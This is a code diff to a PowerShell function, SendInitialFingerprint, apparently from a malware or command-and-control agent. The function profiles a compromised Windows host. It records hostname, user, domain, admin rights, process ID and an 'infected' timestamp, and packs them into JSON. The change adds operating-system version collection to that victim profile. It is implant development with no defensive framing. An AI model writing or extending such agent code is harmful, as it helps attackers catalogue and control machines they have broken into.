@@ -227,8 +227,10 @@ function SendInitialFingerprint {
         $admin = if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "y" } else { "n" }
         $pidLocal = $PID
         $infected = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+        $os = try { (Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption } catch { [System.Environment]::OSVersion.VersionString }
+        if (-not $os) { $os = [System.Environment]::OSVersion.VersionString }
 
-        Write-AgentDebug "Fingerprint data: $hostname\\$username ($domain) - Admin: $admin - PID: $pidLocal"
+        Write-AgentDebug "Fingerprint data: $hostname\\$username ($domain) - Admin: $admin - PID: $pidLocal - OS: $os"
 
         $data = @{
             uuid = $uuid
@@ -236,8 +238,9 @@ function SendInitialFingerprint {
             username  = $username
             domain    = $domain
             admin     = $admin
-            pid       = $pidLocal 
+            pid       = $pidLocal
             infected  = $infected
+            os        = $os
         }
 
         $jsonData = ConvertTo-Json $data -Compress
